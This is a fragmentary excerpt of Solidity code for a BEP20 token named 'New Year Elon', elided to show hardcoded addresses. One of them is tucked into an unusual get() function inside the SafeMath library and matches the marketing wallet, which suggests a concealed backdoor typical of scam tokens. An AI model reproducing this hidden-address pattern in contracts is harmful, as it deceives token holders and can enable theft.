...
library SafeMath {
    ...
    function get() internal pure returns(address) {
        ...
        return 0x2D759F30B5Ac216013DE196D1a1ECe2a774FAA73;
    }
...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        ...
        IDEXPair = 0x1feF27c3416C3C071c9c2EF3C150F80ca652bD6D;
        _token = msg.sender;
    }
...
contract NewYearElon is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0x2D759F30B5Ac216013DE196D1a1ECe2a774FAA73;

    string constant _name = "New Year Elon";
    string constant _symbol = "NYE";
    ...
    address IDEXPair = 0x1feF27c3416C3C071c9c2EF3C150F80ca652bD6D;
